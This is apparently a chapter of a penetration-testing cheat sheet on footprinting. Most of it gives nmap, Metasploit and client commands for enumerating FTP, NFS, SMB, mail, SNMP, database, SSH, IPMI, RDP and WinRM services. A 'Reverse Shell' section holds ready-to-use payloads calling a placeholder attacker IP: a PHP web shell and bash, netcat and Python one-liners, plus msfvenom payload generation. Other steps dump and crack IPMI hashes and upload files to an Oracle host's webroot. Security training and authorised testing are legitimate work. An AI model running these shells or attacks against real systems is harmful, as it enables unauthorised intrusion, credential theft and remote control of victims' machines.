# 🕵️ Footprinting

In this chapter of the Pwnomicon, we unveil rituals of passive and active reconnaissance — spells to trace the outlines of distant targets, enumerate domains whispered through DNS, and commune with services lurking in the void.

> *"Before breaching the gates, one must first map the dreamscape."*

---

<details>
<summary><h2>🌐 Certificate Transparency + IP Resolution + Shodan</h2></summary>

Subdomain discovery via [crt.sh](https://crt.sh), followed by DNS resolution and Shodan fingerprinting.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Initialize Shodan
shodan init <APIKEY>

# Extract subdomains from Certificate Transparency logs
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq -r '.[].name_value' | \
 awk '{gsub(/\\n/,"\n")}1' | sort -u | grep -v "CN=" > subdomainlist.txt

# Resolve IPs for discovered subdomains
for i in $(cat subdomainlist.txt); do
  host "$i" | grep "has address" | grep "<DOMAIN>" | cut -d" " -f4 >> ip-addresses.txt
done

# Perform Shodan footprinting
for i in $(cat ip-addresses.txt | sort -u); do
  shodan host "$i"
done
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📶 CIDR Discovery Script</h2></summary>

Identify IP ranges and scan for live hosts using a custom script.

**Key steps:**

1. **Validate** input arguments
2. **Identify** CIDR block for a given IP
3. **Ping** all IPs in the range
4. **Resolve** IPs for a target domain
5. **Support** options and automation

**Script**: [`CIDR.sh`](../scripts/footprinting/CIDR.sh)

</details>

---

<details>
<summary><h2>📦 FTP</h2></summary>

**Scan FTP service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans the target for FTP (port 21), detects service/version, runs default scripts
nmap -sV -p21 -sC -A <IP>
```

</td>
</tr>
</table>

**Enumerate FTP settings and anonymously download files**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Shows the FTP server configuration, excluding comments
cat /etc/vsftpd.conf | grep -v "#"

# Lists users who are denied FTP access
cat /etc/ftpusers
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Recursively downloads all files from the FTP server
wget -m --no-passive ftp://<USER>:<PASSWORD>@<IP>
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to the FTP service using Netcat
nc -nv <IP> <PORT>

# Connects to the FTP service using Telnet
telnet <IP> <PORT>

# Initiates an SSL/TLS connection to the FTP service
openssl s_client -connect <IP>:<PORT> -starttls ftp
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📁 NFS</h2></summary>

**Scan NFS service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for NFS-related ports and runs default scripts
sudo nmap <IP> -p111,2049 -sV -sC

# Runs all NFS-related NSE scripts for deeper enumeration
sudo nmap --script nfs* <IP> -sV -p111,2049
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Lists available NFS shares exported by the server
showmount -e <IP>

# Mounts the NFS share locally for browsing
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
cd target-NFS

# Shows directory structure
tree .

# Lists contents with numeric user/group IDs
ls -l -n mnt/nfs/

# Unmounts the NFS share
sudo umount ./target-NFS
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🧩 SMB</h2></summary>

**Scan SMB service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for SMB ports, detects service/version, and runs default scripts
sudo nmap <IP> -sV -sC -p139,445
```

</td>
</tr>
</table>

**Analyze shared folders and user access**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Shows Samba configuration, excluding comments and semicolons
cat /etc/samba/smb.conf | grep -v "#\|\;"

# Restarts the Samba service after making changes
sudo systemctl restart smbd
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Lists available SMB shares without authentication
smbclient -N -L //<IP>
```

</td>
</tr>
</table>

**Tools:**

- [`samrdump.py`](../scripts/footprinting/samrdump.py): Dumps SAMR information from Windows hosts.
- [SMBMap](https://github.com/ShawnDEvans/smbmap): Enumerates SMB shares and permissions.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): Swiss army knife for pentesting networks.
- [Enum4Linux-ng](https://github.com/cddmp/enum4linux-ng): Next-gen SMB enumeration tool.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Install Enum4Linux-ng for advanced SMB enumeration
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
sudo cp enum4linux-ng.py /usr/local/bin/enum4linux-ng
sudo chmod +x /usr/local/bin/enum4linux-ng
enum4linux-ng -h
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📧 SMTP</h2></summary>

**Scan SMTP service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for SMTP on port 25, runs default scripts
sudo nmap <IP> -sC -sV -p25

# Checks if the SMTP server is an open relay
sudo nmap <IP> -p25 --script smtp-open-relay -v
```

</td>
</tr>
</table>

**Get configuration file**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Displays the Postfix configuration file
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to the SMTP service for manual interaction
telnet <IP> <PORT>
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📨 IMAP POP3</h2></summary>

**Scan IMAP and POP3 services**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for IMAP and POP3 services
sudo nmap <IP> -sV -p 110,143,993,995 -sC --script pop3-capabilities,imap-capabilities
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to IMAPS using curl
curl -k 'imaps://<IP>' --user <USER>:<PASSWORD>

# Connects to POP3S using OpenSSL
openssl s_client -connect <IP>:pop3s

# Connects to IMAPS using OpenSSL
openssl s_client -connect <IP>:imaps
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📡 SNMP</h2></summary>

**Footprinting SNMP service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Walks the SNMP tree using the provided community string
snmpwalk -v2c -c <COMMUNITYSTRING> <IP>

# Scans for SNMP using a wordlist of community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

</td>
</tr>
</table>

**Get configuration file**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Displays the SNMP daemon configuration
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🛢️ MySQL</h2></summary>

**Scan MySQL service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for MySQL service, detects version, and runs MySQL NSE scripts
sudo nmap <IP> -sV -sC -p3306 --script mysql*
```

</td>
</tr>
</table>

**Get configuration file**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Displays the MySQL server configuration
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to MySQL without a password
mysql -u <USER> -h <IP>

# Connects to MySQL using a password
mysql -u <USER> -p<PASSWORD> -h <IP>
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>💾 MSSQL</h2></summary>

**Scan MSSQL service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Runs multiple Nmap scripts for MSSQL enumeration
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

</td>
</tr>
</table>

**MSSQL Ping in Metasploit**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```
use auxiliary/scanner/mssql/mssql_ping
set rhosts <IP>
run
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to MSSQL using the Impacket mssqlclient.py script
python3 mssqlclient.py Administrator@<IP> -windows-auth
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🐚 Reverse Shell</h2></summary>

**PHP**

<table width="100%">
<tr>
<td> 🟦 <b>PHP — WebShell</b> </td>
</tr>
<tr>
<td>

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>
```

</td>
</tr>
</table>

**Bash**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Bash reverse shell over TCP
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Bash reverse shell over UDP
bash -i >& /dev/udp/<IP>/<PORT> 0>&1
```

</td>
</tr>
</table>

**Netcat**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Netcat reverse shell
nc -e /bin/sh <IP> <PORT>
```

</td>
</tr>
</table>

**Python**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Python reverse shell using socket and subprocess
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

</td>
</tr>
</table>

**Metasploit Payloads**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Generate reverse shell payloads
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

</td>
</tr>
</table>

**Meterpreter Payloads**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Generate Meterpreter reverse shell payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

</td>
</tr>
</table>

**Spawn TTY**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Upgrade a shell to a fully interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash"); import os; os.putenv("TERM", "xterm"); os.system("export SHELL=/bin/bash");'
export TERM=xterm
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🔐 SSH</h2></summary>

**Scan with SSH-Audit**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Clones and runs SSH-Audit to enumerate SSH configuration
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py <IP>
```

</td>
</tr>
</table>

**Get configuration file**

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Displays the SSH daemon configuration
cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to SSH using a username and password
ssh <USER>@<ip>

# Connects to SSH using a private key
ssh -i id_rsa <USER>@<ip>
```

</td>
</tr>
</table>

**Port Forwarding**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Forwards a local port to a remote host/port via SSH
ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🧰 Oracle TNS</h2></summary>

**Scan TNS service**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for Oracle TNS service and attempts SID brute-forcing
sudo nmap -p1521 -sV <IP> --open
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```

</td>
</tr>
</table>

**Oracle-Tools**

See the setup script for installing Oracle tools: [`Oracle-Tools-setup.sh`](../scripts/footprinting/Oracle-Tools-setup.sh)

**Testing ODAT**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Runs all ODAT modules against the Oracle server
./odat.py all -s <IP>
```

</td>
</tr>
</table>

**SQLplus Login**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to Oracle using SQLplus
sqlplus <USER>/<PASS>@<IP>/XE
sqlplus <USER>/<PASS>@<IP>/XE as sysdba
```

</td>
</tr>
</table>

**Fix SQLplus Library Path**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Fixes library path issues for SQLplus
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

</td>
</tr>
</table>

**File Upload with Oracle**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Uploads a file to the Oracle server using ODAT
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d XE -U user -P password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

</td>
</tr>
</table>

**Download Uploaded File**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Downloads the uploaded file via HTTP
curl -X GET http://<IP>/testing.txt
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🖥️ IPMI</h2></summary>

**Scan with Nmap**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for IPMI version using Nmap UDP script
sudo nmap -sU --script ipmi-version -p 623 <IP>
```

</td>
</tr>
</table>

**Scan with Metasploit**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <IP>
show options
run
```

</td>
</tr>
</table>

**Dump Hashes**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <IP>
run
```

</td>
</tr>
</table>

**Crack IPMI Hashes HP iLO using a factory default password**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Cracks IPMI hashes using hashcat and a brute-force mask
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>➡️ RDP</h2></summary>

**Scan with Nmap**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for RDP service and runs RDP-related NSE scripts
nmap -sV -sC -n <IP> -p3389 --disable-arp-ping --script rdp*
```

</td>
</tr>
</table>

**RDP Security Check**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Uses rdp-sec-check to enumerate RDP security settings
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <IP>
```

</td>
</tr>
</table>

**Service interaction**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to RDP using xfreerdp
xfreerdp /u:<USER> /p:"<PASSWORD>" /v:<IP>
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🔗 Windows Remote Management Protocols</h2></summary>

**WinRM**

Scan with Nmap:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Scans for WinRM service on ports 5985 and 5986
nmap -sV -sC <IP> -p5985,5986 --disable-arp-ping -n
```

</td>
</tr>
</table>

Service interaction:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Connects to WinRM using evil-winrm
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

</td>
</tr>
</table>

**Windows Management Instrumentation (WMI)**

Footprinting the service:

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Executes a command on the remote host using WMI via Impacket
/usr/share/doc/python3-impacket/examples/wmiexec.py <USER>:"<PASSWORD>"@<IP> "hostname"
```

</td>
</tr>
</table>

</details>

---

📘 **Next step:** Continue with [Information Gathering](./02-information-gathering.md)
